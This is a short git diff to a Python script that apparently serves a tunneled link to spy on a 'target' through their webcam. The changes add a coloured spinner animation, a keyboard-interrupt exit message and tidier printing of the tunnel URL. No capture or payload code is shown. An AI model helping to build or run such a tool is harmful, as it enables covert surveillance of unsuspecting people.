@@ -38,7 +38,17 @@ def Sprint(text):
     sys.stdout.write(character)
     sys.stdout.flush()
     sleep(0.1)
-
+#smooth rotation====================================================================================================
+def rotation(text):
+    for _ in range(4):
+        print(Fore.BLUE + "[\\]" ,text ,  end= "\r")
+        sleep(0.7)
+        print(Fore.RED + "[|]" , end= "\r")
+        sleep(0.7)
+        print(Fore.CYAN + "[/]" , end= "\r")
+        sleep(0.7)
+        print(Fore.GREEN + "[-]" , end= "\r")
+        sleep(0.7)
 #Check php is installed ====================================================================================================
 
 check = subprocess.call("php -v" , stdout=subprocess.DEVNULL , shell=True)
@@ -98,11 +108,18 @@ def webcam():
 
     loaclhost()
 
-    sleep(10)
-
+    try:
+        print(" ")
+        rotation(Fore.YELLOW + "please wait 10 second".title()  + Fore.RESET)
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+    print("                          " , end="\r")
+    
 #====================================================================================================
     line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r\n{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
     linecache.clearcache()
 
     Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
